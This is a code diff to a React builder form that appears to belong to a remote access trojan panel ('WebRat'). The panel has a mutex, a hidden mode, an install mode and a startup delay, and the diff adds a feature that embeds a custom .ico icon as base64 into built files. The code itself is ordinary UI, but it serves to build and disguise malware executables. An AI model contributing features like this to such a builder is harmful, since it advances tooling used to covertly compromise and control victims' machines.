@@ -6,12 +6,15 @@ import { BuilderNiceSelect } from "./builder-nice-select";
 import { BuilderStartupDelay } from "./builder-startup-delay";
 import { BuilderTextInput } from "./builder-text-input";
 import { inputFixedClass } from "../styles";
+import { readIcoAsBase64 } from "../utils/icon";
+import { showToastSafe } from "../utils/toast";
 
 export function BuilderForm(props: { open: boolean; mutex: string }) {
   const { open, mutex } = props;
 
   const [installMode, setInstallMode] = useState<string>("random");
   const [delay, setDelay] = useState<number>(2);
+  const [iconBase64, setIconBase64] = useState<string>("");
   const [hidden, setHidden] = useState<boolean>(true);
   const [isOpenClass, setIsOpenClass] = useState<boolean>(false);
   const formRef = useRef<HTMLDivElement | null>(null);
@@ -47,12 +50,71 @@ export function BuilderForm(props: { open: boolean; mutex: string }) {
     return Math.max(1, Math.min(10, v));
   };
 
-  const showToastSafe = (type: "success" | "error" | "warning" | "info", message: string) => {
-    try {
-      window.WebRatCommon?.showToast?.(type, message);
-    } catch {
-    }
-  };
+  useEffect(() => {
+    const chooseBtn = document.getElementById("buildIconChooseBtn") as HTMLButtonElement | null;
+    const clearBtn = document.getElementById("buildIconClearBtn") as HTMLButtonElement | null;
+    const input = document.getElementById("buildIcon") as HTMLInputElement | null;
+    const nameEl = document.getElementById("buildIconName") as HTMLDivElement | null;
+
+    const updateName = () => {
+      if (!nameEl) return;
+      const fileName = input?.files?.[0]?.name;
+      nameEl.textContent = fileName ? String(fileName) : "No icon selected";
+    };
+
+    const onChoose = () => {
+      try {
+        input?.click();
+      } catch {
+      }
+    };
+
+    const onClear = () => {
+      setIconBase64("");
+      try {
+        if (input) input.value = "";
+      } catch {
+      }
+      updateName();
+    };
+
+    const onInput = () => {
+      void (async () => {
+        const f = input?.files?.[0];
+        if (!f) {
+          setIconBase64("");
+          updateName();
+          return;
+        }
+
+        const res = await readIcoAsBase64(f);
+        if (!res) {
+          setIconBase64("");
+          try {
+            if (input) input.value = "";
+          } catch {
+          }
+          updateName();
+          return;
+        }
+
+        setIconBase64(res.base64);
+        updateName();
+      })();
+    };
+
+    updateName();
+
+    chooseBtn?.addEventListener("click", onChoose);
+    clearBtn?.addEventListener("click", onClear);
+    input?.addEventListener("change", onInput);
+
+    return () => {
+      chooseBtn?.removeEventListener("click", onChoose);
+      clearBtn?.removeEventListener("click", onClear);
+      input?.removeEventListener("change", onInput);
+    };
+  }, []);
 
   const onCreate = () => {
     const buildName = (document.getElementById("buildName") as HTMLInputElement | null)?.value ?? "";
@@ -69,6 +131,7 @@ export function BuilderForm(props: { open: boolean; mutex: string }) {
     const delaySec = clampDelay(delay);
     if (delaySec !== delay) setDelay(delaySec);
 
+    void iconBase64;
     showToastSafe("info", "Build flow is being ported");
   };
 
